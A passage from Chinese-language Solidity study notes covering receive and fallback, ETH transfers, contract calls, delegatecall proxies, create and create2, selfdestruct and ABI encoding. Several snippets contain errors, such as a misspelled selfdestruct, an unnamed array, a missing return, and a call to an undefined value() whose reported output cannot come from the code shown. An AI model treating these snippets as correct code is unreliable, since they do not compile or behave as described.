^0.8.21;<br><br>import &#123;Sort&#125; from &#x27;./bubbleSort.sol&#x27;;<br><br>contract importTest &#123;<br>    function test(uint[] memory arr) external &#123;<br>        Sort a = new Sort();<br>        a.bubbleSort(arr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="19-接收ETH"><a href="#19-接收ETH" class="headerlink" title="19. 接收ETH"></a>19. 接收ETH</h2><p>主要使用 <code>receive()</code> 和 <code>fallback()</code></p><p><strong>注意</strong>：0.6.x版本前只有 <code>fallback</code></p><h3 id="接受函数-receive"><a href="#接受函数-receive" class="headerlink" title="接受函数 receive"></a>接受函数 receive</h3><ul><li>一个合约最多一个</li><li>食用方式：<code>receive() external payable&#123; ··· &#125;</code>，<strong>无参数</strong>，<strong>无返回值</strong>，<strong>必须是 </strong><code>external</code> 和 <code>payable</code></li><li>最好不要执行太多逻辑（见 20. 发送ETH）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">event hasReceived(address Sender, uint Value);<br>receive() external payable &#123;<br>emit hasReceived(msg.sender, msg.value);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="回退函数-fallback"><a href="#回退函数-fallback" class="headerlink" title="回退函数 fallback"></a>回退函数 fallback</h3><ul><li>调用合约不存在的函数时使用（传达参数不同也被视为不存在的函数）。</li><li>可用于接收 ETH，代理合约 <code>proxy contract</code></li><li>食用方式：<code>fallback external payable &#123; ··· &#125;</code>，同样，<strong>无参数</strong>，<strong>无返回值</strong>，<strong>必须是</strong> <code>external</code> 和 <code>payable</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">event hasFallbacked(address Sender, uint Value, bytes Data);<br>fallback() external payable &#123;<br>        emit hasFallbacked(msg.sender, msg.value, msg.data);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fallback-or-receive"><a href="#fallback-or-receive" class="headerlink" title="fallback or receive?"></a>fallback or receive?</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gcode">             接收ETH<br>|<br>   msg.data是空？<br>           /      \<br>           是        否<br>         /           \<br>receive<span class="hljs-comment">()</span>存在?   fallback<span class="hljs-comment">()</span><br>       /    \<br>      是     否<br> /        \<br>receive<span class="hljs-comment">()</span>   fallback<span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><p>即：仅当 msg.data 为空且存在 receive() 时触发 receive()；否则触发 fallback()；</p><p>​       均不存在时不能直接发送，可以用 <code>payable</code> 的 <code>function</code> 发送</p><h2 id="间章：查询和部署时发送-ETH"><a href="#间章：查询和部署时发送-ETH" class="headerlink" title="间章：查询和部署时发送 ETH"></a>间章：查询和部署时发送 ETH</h2><h3 id="查询当前合约的-ETH"><a href="#查询当前合约的-ETH" class="headerlink" title="查询当前合约的 ETH"></a>查询当前合约的 ETH</h3><p>我们使用 <code>address(这里是地址).balance</code> 查询合约的 ETH 余额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract receiveETH &#123;<br>    event log(uint amount, uint gas);<br>    receive() external payable &#123;<br>        emit log(msg.value, gasleft()); //返回ETH值与消耗的gas<br>    &#125;<br>    function getBalance() view public returns(uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="在部署合约时发送-ETH"><a href="#在部署合约时发送-ETH" class="headerlink" title="在部署合约时发送 ETH"></a>在部署合约时发送 ETH</h3><p>我们在合约中加入 <code>payable</code> 的构造函数，使部署合约时可以向其中转入 ETH</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract sendETTH&#123;<br>    constructor() payable &#123;&#125;<br>    receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="20-发送-ETH"><a href="#20-发送-ETH" class="headerlink" title="20. 发送 ETH"></a>20. 发送 ETH</h2><p>使用 <code>transfer()</code>, <code>send()</code> 或 <code>call()</code>，鼓励使用 <code>call()</code></p><h3 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h3><ul><li>用法：<code>接收方地址.transfer(数额)</code></li><li>gas 限制 2300</li><li>转账失败会自动 <code>revert</code>（回滚交易）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function trans(address payable _to, uint _amount) external payable &#123;<br>_to.transfer(_amount);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="send"><a href="#send" class="headerlink" title="send"></a>send</h3><ul><li>用法：<code>接收方地址.send(数额)</code></li><li>gas 限制 2300</li><li>不会自动 <code>revert</code>，要手动判断</li><li>返回值为 <code>bool</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">error sendFailed();<br>    function sends(address payable _to, uint _amount) external payable &#123;<br>        bool success = _to.send(_amount);<br>        if (!success) &#123;<br>            revert sendFailed();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><ul><li>用法：<code>接收方地址.call&#123;value: 数额&#125;(&quot;&quot;)</code></li><li>无 gas 限制，<code>receive</code> 可执行复杂逻辑</li><li>不会自动 <code>revert</code>，要手动判断</li><li>返回值为 <code>(bool, bytes)</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">error callFailed(string);<br>function calls(address payable _to, uint _amount) external payable &#123;<br>    (bool success, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>        if (!success) &#123;<br>       revert callFailed(&quot;Failed to call&quot;);<br>        &#125;   <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="21-调用其他合约"><a href="#21-调用其他合约" class="headerlink" title="21. 调用其他合约"></a>21. 调用其他合约</h2><p>已知我们拥有如下合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract tar&#123;<br>    uint private _x;<br>    event log(uint amount, uint gas);<br><br>    function setX(uint x) external payable &#123;// 调整 _x 的值，或往合约里转ETH，并记录转入值和 gas 剩余<br>        _x = x;<br>        if (msg.value &gt; 0) &#123;<br>            emit log(msg.value, gasleft());<br>        &#125;<br>    &#125;<br><br>    function getX() external view returns(uint x)&#123;// 获得 _x 的值<br>        x = _x;<br>    &#125;<br><br>    function getBalance() external view returns(uint) &#123;// 返回当前合约的ETH余额<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-传入合约地址调用函数"><a href="#1-传入合约地址调用函数" class="headerlink" title="1. 传入合约地址调用函数"></a>1. 传入合约地址调用函数</h3><p>传入目标合约的地址，生成引用，调用目标函数</p><p>格式：<code>合约名(合约地址).函数名(函数参数);</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract useTar&#123;<br>    // _addr 为 tar 合约的地址,y 为 setX 函数的参数(uint x)<br>    function callSetX(address _addr, uint y) external&#123;<br>        tar(_addr).setX(y);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一般这种已经够用了。</p><h4 id="调用函数的同时发送-ETH"><a href="#调用函数的同时发送-ETH" class="headerlink" title="调用函数的同时发送 ETH"></a>调用函数的同时发送 ETH</h4><p>若目标函数为 <code>payable</code>，可以通过以下方式调用它给合约转账：<code>_Name(_Address).f&#123;value: _Value&#125;();</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">_Name</span>合约名<br><span class="hljs-variable">_Address</span>合约地址<br>f目标函数名<br><span class="hljs-variable">_Value</span>ETH 数额，前一个 value: 为格式<br>()传入目标函数的参数<br></code></pre></td></tr></table></figure><p>也就是在上述调用方法里加个<code>&#123;&#125;</code>，注明发送数额。</p><p>如下可以向 tar 合约中转账1 wei，并传入 y</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function sendETH(address _addr, uint y) external payable &#123;<br>    tar(_addr).setX&#123;value: 1&#125;(y);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-传入合约变量"><a href="#2-传入合约变量" class="headerlink" title="2. 传入合约变量"></a>2. 传入合约变量</h3><p>直接在函数的参数里传入合约的引用。</p><p>方法：将 <code>address</code> 类型换为目标合约名。调用格式：<code>以合约名为类型的参数.目标函数(参数)；</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callAndGetX(tar _addr, uint y) external returns(uint x)&#123;<br>_addr.setX(y);// 效果同上<br>x = _addr.getX();// 获得 x 的值<br>&#125;<br></code></pre></td></tr></table></figure><p>注：<code>tar _addr</code> 底层类型仍是 <code>address</code>，生成的 ABI 中，调用时传入的参数仍是 <code>address</code> 类型</p><h3 id="3-创建合约变量"><a href="#3-创建合约变量" class="headerlink" title="3. 创建合约变量"></a>3. 创建合约变量</h3><p>创建一个新变量存储目标合约的引用。</p><p>前置：<code>目标合约名 变量名 = 目标合约名(合约的地址);</code></p><p>使用：<code>变量名.目标函数(参数);</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function newVar(address _addr, uint y) external returns(uint x) &#123;<br>    tar usetar = tar(_addr);// 前置步骤，用变量 usetar 储存了 合约tar的引用，剩余步骤效果同上<br>    usetar.setX(y);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="22-通过Call调用合约"><a href="#22-通过Call调用合约" class="headerlink" title="22. 通过Call调用合约"></a>22. 通过Call调用合约</h2><p><code>call</code> 是 <code>address</code> 类型的低级成员，返回 <code>(bool, bytes memory)</code>，对应 call 是否成功及函数返回值</p><ul><li>call 是推荐的发送 ETH 的方式，不推荐用来调用合约，因为这样会把控制权交给可能不安全的合约（推荐使用上述法3）</li><li>当不知道对方源码或 ABI 时，无法生成合约变量，此时就可以用 call 调用对方的函数</li></ul><p>使用规则：<code>目标合约地址.call(字节码);</code></p><ul><li>字节码通过 <code>abi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数)</code> 获得<ul><li>函数签名为 <code>函数名(逗号分隔的参数类型)</code></li><li>以 <code>callSetX</code> 为例：<code>abi.encodeWithSignature(&quot;callSetX(address,uint256)&quot;, _addr, y)</code></li><li>==<strong>注意！！！</strong>==：在参数类型中 <strong>不能有</strong> 任何空格，即 <code>&quot;callSetX(address, uint)&quot;</code> 是错误的，因为逗号后存在空格</li><li><code>uint</code> 应写作 <code>uint256</code></li></ul></li><li>伴随 ETH 和 gas 进行调用：<code>地址.call&#123;value:发送数额, gas:gas数额&#125;(字节码);</code></li></ul><p>已知有如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;./Use_Other_Contract.sol&quot;;<br>contract tarCall is tar &#123;<br>    fallback() external payable &#123;&#125;<br>    receive() external payable&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>调用 <code>setX</code>并转一些 ETH</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract useCall &#123;<br>    event response(bool _success, bytes _data);// 便于观察返回值<br>    receive() external payable&#123;&#125;<br><br>    function callSetX(address payable _addr, uint y) external payable&#123;<br>        (bool success, bytes memory data) = _addr.call&#123;value:msg.value&#125;(<br>            abi.encodeWithSignature(&quot;setX(uint256)&quot;, y)<br>        );<br>// 假设我们转入了 23Wei, x设为234<br>        emit response(success, data);// 结果为 true 和 0x<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>调用 <code>getX</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callGetX(address _addr) external returns(uint) &#123;<br>(bool success, bytes memory data) = _addr.call(<br>abi.encodeWithSignature(&quot;getX()&quot;)<br>);<br><br>emit response(success, data);<br>// 结果为 true, 0x00000000000000000000000000000000000000000000000000000000000000ea<br>return abi.decode(data,(uint));// 解码后结果确实是 234<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>调用不存在的函数 —-&gt; 触发 fallback</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callNonexist(address _addr) external &#123;<br>(bool success, bytes memory data) = _addr.call(<br>abi.encodeWithSignature(&quot;Nonexist(uint)&quot;)<br>    );<br>// 无法调用 Nonexist(uint)，实际触发的是fallback<br>    emit response(success, data);// 结果为 true, 0x<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="23-Delegatecall"><a href="#23-Delegatecall" class="headerlink" title="23. Delegatecall"></a>23. Delegatecall</h2><p>简单的英语小知识：delegate v. 委托，授权，委派</p><p><code>delegatecall</code>与 <code>call</code>  类似，是 <code>address</code> 类型的低级成员</p><h3 id="call-与-delegatecall"><a href="#call-与-delegatecall" class="headerlink" title="call 与 delegatecall"></a>call 与 delegatecall</h3><h4 id="1-call"><a href="#1-call" class="headerlink" title="1. call"></a>1. call</h4><p>A 通过 contract B 来 call contract C，执行 C 的函数，上下文（contest,包含变量和状态的环境）为 C；msg.sender 为 B，改变状态变量的结果作用于 C</p><p><img src="https://images.mirror-media.xyz/publication-images/VgMR533pA8WYtE5Lr65mQ.png?height=698&amp;width=1860" alt="call"></p><h4 id="2-delecatecall"><a href="#2-delecatecall" class="headerlink" title="2. delecatecall"></a>2. delecatecall</h4><p>A 通过 contract B 来 call contract C，执行 C 的函数，上下文仍为 B；msg.sender 为 A，改变状态变量的结果作用于 B</p><p><img src="https://images.mirror-media.xyz/publication-images/JucQiWVixdlmJl6zHjCSI.png?height=702&amp;width=1862" alt="delecatecall"></p><h3 id="Delegatecall-的使用"><a href="#Delegatecall-的使用" class="headerlink" title="Delegatecall 的使用"></a>Delegatecall 的使用</h3><p>大致与 <code>call</code> 类似，区别在于 <code>delegatecall</code> 尽可以指定 gas，不能指定发送的 ETH 数额</p><blockquote><p><strong>注意</strong>：<code>delegatecall</code>有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。</p></blockquote><ul><li>使用场景：<ol><li>代理合约(Proxy Contract)：将存储合约与逻辑合约分开。代理合约存储相关变量和逻辑合约的地址，函数存在逻辑合约里，通过 <code>delecatecall</code> 执行。升级时只需将代理合约指向新的逻辑合约即可。</li><li>EIP-2535 Diamonds(钻石)：详见<a href="https://eip2535diamonds.substack.com/p/introduction-to-the-diamond-standard">钻石标准简介</a>（看不懂一点）</li></ol></li></ul><p>例，有如下合约使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>contract Proxy &#123;<br>    struct player &#123;<br>        uint256 id;<br>        string name;<br>        uint256 level;<br>    &#125;<br>    player public Player;<br>    address public sender;<br><br>    event log(bool success, bytes data);<br>    <br>    function setLogic(address _addr) public &#123;<br>        sender = _addr;<br>    &#125;<br><br>    function SetPlayer(<br>        uint256 _id,<br>        string memory _name,<br>        uint256 _exp<br>        ) public &#123;<br>            (bool _success, bytes memory _data) = sender.delegatecall(<br>                abi.encodeWithSignature(&quot;setPlayer(uint256,string,uint256)&quot;, _id, _name, _exp)<br>            );<br>            <br>            emit log(_success, _data);<br>        &#125;<br>&#125;<br><br>contract Logic &#123;<br>    struct player &#123;<br>        uint256 id;<br>        string name;<br>        uint256 level;<br>    &#125;<br>    player public Player;<br>    address public sender;<br><br>    function setPlayer(<br>        uint256 _id,<br>        string memory _name,<br>        uint256 _exp<br>        ) public &#123;<br>            Player.id = _id;<br>            Player.name = _name;<br>            Player.level = _exp/1000;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>若要更改经验与等级的转换公式，只需部署更改后的 Logic 合约，然后在代理合约中重新输入 Logic 合约的地址即可</p><h2 id="24-在合约中创建新合约"><a href="#24-在合约中创建新合约" class="headerlink" title="24. 在合约中创建新合约"></a>24. 在合约中创建新合约</h2><p>有两种方法：<code>create</code> 和 <code>create2</code></p><h3 id="create"><a href="#create" class="headerlink" title="create"></a>create</h3><p>用法：<code>Contract x = new Contract&#123;value: _value&#125;(params)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">Contract 合约名<br>x接收合约地址的变量<br>&#123;value: _value&#125;若有 payable 的 constructor，可在创建时转入 _value 的 ETH<br>(params)新合约 constructor 的参数<br></code></pre></td></tr></table></figure><p>create地址的计算：<code>新地址 = hash(创建者地址，nonce)</code></p><ul><li>创建者地址：通常为部署的钱包或合约地址</li><li>nonce：该地址发送交易的总数，对用户而言是创建的合约总数 —-&gt; 每创建一个合约，nonce 就 +1</li><li>即：nonce 会随未来的事件改变 —-&gt; create 创建的地址不好预测 —-&gt; 引入 create2</li></ul><h3 id="create2"><a href="#create2" class="headerlink" title="create2"></a>create2</h3><p>地址计算：<code>新地址 = hash(&quot;0xFF&quot;, 创建者地址, salt, initcode)</code></p><ul><li><code>&quot;0xFF&quot;</code>：一个常数，避免与 create 冲突</li><li><code>salt</code>(盐)：一个创作者指定的 <code>bytes32</code> 类型的值，用来影响新创建的合约地址  </li><li><code>initcode</code>：新合约的初始字节码（合约的 Creation Code和构造函数的参数 ）</li></ul><p>用法：<code>Contract x = new Contract&#123;salt: _salt, value: _value&#125;(params)</code></p><h2 id="25-删除合约"><a href="#25-删除合约" class="headerlink" title="25. 删除合约"></a>25. 删除合约</h2><p><code>selfdestruct</code> 可以将该合约剩余的 ETH 转到指定地址（即使它没有receive 或 fallback）。坎昆升级前可用于删除合约自身，升级后不可，仍会保留该合约。</p><p>目前来说：</p><ol><li>已部署的合约无法被 <code>selfdestruct</code></li><li>要想使用删除合约的功能，必须在同一笔交易中创建并自毁合约</li></ol><p>食用方法：<code>selfdetruct(_addr);</code>，其中，<code>_addr</code> 为接收 ETH 的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract deleteContract &#123;<br>    constructor() payable&#123;&#125;// 部署时转入 1ETH<br>    receive() external payable&#123;&#125;<br><br>    function useDestruct() external &#123;<br>        selfdestruct( payable(msg.sender) );// 调用后 1ETH 被返回msg.sender<br>    &#125;<br><br>    function getBalance() external view returns(uint balance) &#123;<br>        balance = address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以下展示了删除合约自身</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract destroy &#123;<br>    constructor() payable&#123;&#125;<br><br>    struct demo &#123;<br>        uint _balance;<br>        address _addr;<br>        uint _value;<br>    &#125;<br><br>    function getBalance() external view returns(uint balance) &#123;<br>        balance = address(this).balance;<br>    &#125; <br><br>    function destruction() public payable returns(demo memory)&#123;<br>        deleteContract del = new deleteContract&#123;value: msg.value&#125;();<br>        demo memory res = demo(&#123;<br>            _balance: del.getBalance(),<br>            _addr: address(del), <br>            _value: del.value()<br>        &#125;);<br>        del.useDestruct();<br>        return res;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>部署并传入 1 ETH，调用 <code>destruction</code> 函数，得到返回值 <code>0,0xf7D2eCC586332F18fa249A9A65da252036dBb8EC,100</code>，表明 <code>del</code> 合约中ETH 剩余为 0，<code>del</code> 合约的地址，<code>value = 100</code>。将上述地址以 <code>DeleteContract</code> 合约导入（导入的 <code>contract</code> 即 <code>del</code>合约），调用 <code>value</code> 和 <code>getBalance</code> 均 <code>Error</code></p><h2 id="26-ABI编码解码"><a href="#26-ABI编码解码" class="headerlink" title="26. ABI编码解码"></a>26. ABI编码解码</h2><p>即Application Binary Interface(应用二进制接口)，是与以太坊智能合约交互的基础。</p><p>数据基于类型编码；由于编码后不包含类型信息，解码时需注明类型</p><h3 id="ABI编码"><a href="#ABI编码" class="headerlink" title="ABI编码"></a>ABI编码</h3><p>对如下4个变量进行编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint x = 22;<br>address addr = 0xf7D2eCC586332F18fa249A9A65da252036dBb8EC;<br>string name = &quot;victifa&quot;;<br>uint[2] = [11, 27];<br></code></pre></td></tr></table></figure><ol><li><code>abi.encode</code></li></ol><p>将给定参数按照<a href="https://learnblockchain.cn/docs/solidity/abi-spec.html">ABI规则</a>编码。ABI将每个参数填充为32字节的数据，连接到一起。</p><ul><li>如果要和智能合约交互，就用 <code>abi.encode</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function encode()public view returns(bytes memory res) &#123;<br>res = abi.encode(x, addr, name, arr);<br>&#125;<br></code></pre></td></tr></table></figure><p>由于每个数据都被填充为32字节，中间有很多0。结果为 ：<code>0x0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000f7d2ecc586332f18fa249a9a65da252036dbb8ec00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000001b00000000000000000000000000000000000000000000000000000000000000077669637469666100000000000000000000000000000000000000000000000000</code></p><ol><li><code>abi.encodePacked</code></li></ol><p>将给定参数按所需最低空间编码（如用1字节编译uint8）。类似 <code>abi.encode</code>，但省去了很多0。</p><ul><li>如果要省空间，且不与合约交互，就用 <code>abi.encodePacked</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function encodePacked()public view returns(bytes memory res) &#123;<br>res = abi.encodePacked(x, addr, name, arr);<br>&#125;<br></code></pre></td></tr></table></figure><p>结果为：<code>0x0000000000000000000000000000000000000000000000000000000000000016f7d2ecc586332f18fa249a9a65da252036dbb8ec76696374696661000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000001b</code></p><ol><li><p><code>abi.encodeWithSignature</code></p><blockquote><p>等同于 <code>abi.encodeWithSelector( bytes4( keccak256( bytes(signature) ) ), ... )</code></p></blockquote></li></ol><p>类似 <code>abi.encode</code>，但第一个参数为函数签名</p><ul><li><p>调用其他合约时使用。如通过 <code>call</code> 调用其他合约：</p><p><code>_addr.call&#123;value: _value, gas: _amount&#125;( abi.encodeWithSignature(&quot;example(uint,string)&quot;, _num, _name) );</code></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function encodeWithSignature()public view returns(bytes memory res) &#123;<br>res = abi.encodeWithSignature(&quot;test(uint256,address,string,uint256[2])&quot;, x, addr, name, arr);<br>&#125;<br></code></pre></td></tr></table></figure><p>仍然对上述4个参数编码（假定函数为<code>test</code>），结果为：<code>0x31ceee1e0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000f7d2ecc586332f18fa249a9a65da252036dbb8ec00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000001b00000000000000000000000000000000000000000000000000000000000000077669637469666100000000000000000000000000000000000000000000000000</code></p><ul><li>等同于在 <code>abi.encode</code> 结果前加上了4字节的函数选择器（见下29. 选择器）</li></ul><ol><li><code>abi.encodeWithSelector</code></li></ol><p>与3类似，但第一个参数为函数选择器（函数签名Keccak哈希的前4个字节）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function encodeWithSelector()public view returns(bytes memory res) &#123;<br>res = abi.encodeWithSelector(<br>bytes4( keccak256(&quot;test(uint256,address,string,uint256[2])&quot;) ), <br> x, addr, name, arr<br>);<br>&#125;<br></code></pre></td></tr></table></figure><p>结果为：<code>0x31ceee1e0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000f7d2ecc586332f18fa249a9a65da252036dbb8ec00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000001b00000000000000000000000000000000000000000000000000000000000000077669637469666100000000000000000000000000000000000000000000000000</code></p><h3 id="ABI解码"><a href="#ABI解码" class="headerlink" title="ABI解码"></a>ABI解码</h3><p>即：<code>abi.decode</code>，用于解码 <code>abi.encode</code> 生成的二进制编码，还原为原参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 